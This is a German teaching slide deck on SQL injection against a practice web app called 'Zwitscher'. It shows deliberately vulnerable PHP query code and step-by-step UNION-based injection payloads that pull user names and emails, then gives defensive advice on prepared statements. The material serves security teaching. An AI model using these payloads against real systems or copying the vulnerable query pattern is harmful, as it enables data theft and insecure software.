# SQL injections
## Spaß ~~und Profit~~

---

## SQL

- **S**tructured **Q**uery **L**anguage
- Datenbanksprache
- Häufig genutzt in Web-Anwendungen
- LAMP ( Linux / Apache / MySQL / PHP )

---

## Übungsumgebung

- [Zwitscher](../zwitscher/)

---

## Beispiel-Abfragen

- [SELECT ... FROM ... ](http://www.w3schools.com/sql/sql_select.asp) - Selektiere Daten aus Tabelle
- [WHERE](http://www.w3schools.com/sql/sql_where.asp) - Optional: Formulierung von Bedingungen

---

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#wisdom</td>
    <td class="tg-0lax">Things always end well.</td>
  </tr>
</tbody>
</table>

```sql
SELECT * FROM zwitscher;
```

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#wisdom</td>
    <td class="tg-0lax">Things always end well.</td>
  </tr>
</tbody>
</table>

---

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#wisdom</td>
    <td class="tg-0lax">Things always end well.</td>
  </tr>
</tbody>
</table>

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia';
```
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
</tbody>
</table>


---

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#wisdom</td>
    <td class="tg-0lax">Things always end well.</td>
  </tr>
</tbody>
</table>

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia' OR hashtag = '#cat';
```

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
</tbody>
</table>

---

<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">hashtag</span></th>
    <th class="tg-0lax"><span style="font-weight:bold">message</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#trivia</td>
    <td class="tg-0lax">Viel Spaß beim Hacken</td>
  </tr>
  <tr>
    <td class="tg-0lax">Flauschi</td>
    <td class="tg-0lax">#cat</td>
    <td class="tg-0lax">Miau</td>
  </tr>
  <tr>
    <td class="tg-0lax">mischa</td>
    <td class="tg-0lax">#wisdom</td>
    <td class="tg-0lax">Things always end well.</td>
  </tr>
</tbody>
</table>

```sql
SELECT user FROM zwitscher WHERE message = 'Things always end well.';
```
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-0lax{text-align:left;vertical-align:top}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-0lax"><span style="font-weight:bold">user</span></th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-0lax">mischa</td>
  </tr>
</tbody>
</table>

---

## Dynamische Abfragen mit PHP

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
$q = mysql_query($sql);
```

[Code ausführen](../zwitscher/)

<br />
<br />

<span style="color:red">Schlechter Code! Nicht nachmachen!</span>

---

## Dynamische Abfragen mit PHP
- Eingabe wird weder überprüft noch maskiert ("escaped")!
- Was könnte passieren, wenn der Benutzer eine "bösartige" Eingabe macht?
<br />
<br />
<span style="color:red">Schlechter Code! Nicht nachmachen!</span>

---

## Abfrage 1

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#cat</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
```

[Code ausführen](../zwitscher/?search=%23cat)

---

## Abfrage 2

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#cat' OR hashtag = '#trivia</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
```

[Code ausführen](../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia)

---

## Abfrage 3

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#dog' OR '1'='1</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
```

[Code ausführen](../zwitscher/?search=%23dog%27+OR+%271%27%3D%271)

---

## Was haben wir bisher gelernt?

- Offensichtlich und gewollt: Benutzer können den Suchbegriff ändern
- Ungewollt: Angreifer können die gesamte Abfrage manipulieren

<br />
<br />
<br />

### Ist das gefährlich?

---

# Ja, es ist gefährlich!

- Angreifer kann sich ggf. ohne Passwort einloggen
- Angreifer ist nicht auf aktuelle Tabelle beschränkt
- SQL erlaubt das "Aneinanderreihen" zweier Ergebnistabellen mit [UNION](http://www.w3schools.com/sql/sql_union.asp)

---

# Union
```sql
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;
```

---

## Mehr über Zwitscher

- [Zwitscher](../zwitscher/) besitzt eine Benutzertabelle
- Wir kennen den Namen der Tabelle und die Namen ihrer Spalten
<br />
<br />
- Name der Tabelle: *user*
- Namen der Spalten: *username*, *mail*, *password*, *age*
<br />
<br />

**Ansatz: Ergänze eine "normale" Abfrage um eine zusätzliche Abfrage der Tabelle *user***

---

## Erster Versuch

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
```
---
Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user';
```

[Code ausführen](../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user)

<div style="text-align: left"><i>"SQL-Fehler: Es wurde ein Fehler in Ihrer SQL-Syntax gefunden. Suchen Sie in der zu Ihrer MySQL-Server-Version gehörigen Anleitung nach der richtigen Syntax bei der Benutzung von ''' in Zeile 1."</i></div>
<div style="text-align: left"><i>"Syntax-Fehler: Es gibt ein störendes Anführungszeichen."</i></div>

---

## Zweiter Versuch

- Was tun mit ungewolltem Code?
<br />
- Auskommentieren!
- Ansatz: Werde störende Zeichen los, indem du sie auskommentierst

--

## Zweiter Versuch

Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>

( **Wichtig:** Leerzeichen nach Trennzeichen )

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+)

<div style="text-align: left"><i>"SQL-Fehler: Die benutzten SELECT-Aussagen haben eine unterschiedliche Anzahl von Spalten."</i></div>

<div style="text-align: left">UNION benötigt die selbe Anzahl von Feldern in beiden Ergebnis-Tabellen.</div>

---

## Und jetzt?

- Wie viele Spalten hat das Ergebnis der ersten Abfrage?
- Keine Ahnung :(

<br />
<br />
<br />

### Kommen wir nicht mehr weiter?   

---

## Was sollen wir tun? Durchprobieren!

- "1" gibt eine Tabelle mit einer Zeile und einem Feld, das '1' enthält, zurück
- "1, 2" gibt eine Tabelle mit einer Zeile und zwei Feldern, die '1' und '2' enthalten, zurück
- "1, 2, 3" gibt eine Tabelle mit ... zurück
- ...
<br />
<br />

**Ansatz: Ausprobieren... Inkrementieren, bis es keinen Fehler mehr gibt**

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)

:(

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>

```php
$sql = "SELECT * 
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)

:(

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)

:)

---

## Dritter Versuch

- Wie viele Spalten sind in der Ergebnis-Tabelle der ersten Abfrage?
- Drei Spalten!
- Wähle drei Spalten: *username*, *mail*, *age*
<br />
<br />

Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; -- </span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';
```

[Code ausführen](../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+)

Bingo!

---

## Zusammenfassung

- Nicht nur die vorgesehene, sondern auch andere Tabellen können gelesen werden

- Es gibt Probleme:

    - Tabellennamen sind nicht immer bekannt
    - Feldnamen sind nicht immer bekannt

<br />
<br />
<br />

### Und jetzt?

---

## Wie man sich Tabellennamen und Spaltennamen beschafft

- Metadaten sind hier dokumentiert: [information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- Besonders hier:
    - [information_schema.tables](https://dev.mysql.com/doc/refman/8.0/en/tables-table.html)
    - [information_schema.columns](https://dev.mysql.com/doc/refman/8.0/en/columns-table.html)
<br />
<br />
<br />

### Wie erhalten wir jetzt die Namen? Genau wie vorher!

---

## Wie mache ich meinen Code sicher?

- Traue keinen Nutzereingaben
- Benutze keine Abfragen, die aus festen Zeichenketten und Nutzereingaben zusammengesetzt werden
- Benutze sichere Methoden für die Datenbank-Interaktion
- In PHP z.b.: prepared statements

---

## Und jetzt ihr!

Es gibt eine dritte Tabelle in [Zwitscher](../zwitscher/)...
<br />
<br />

**Könnt ihr sie auslesen?**

---

## Links
- [Pentestmonkey Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Exploiting Filtered SQLi](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections)
- [Filter Evasion Cheat Sheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
- [Wikipedia (English)](http://en.wikipedia.org/wiki/SQL_injection)
- [Source Code of Zwitscher](../zwitscher/?src)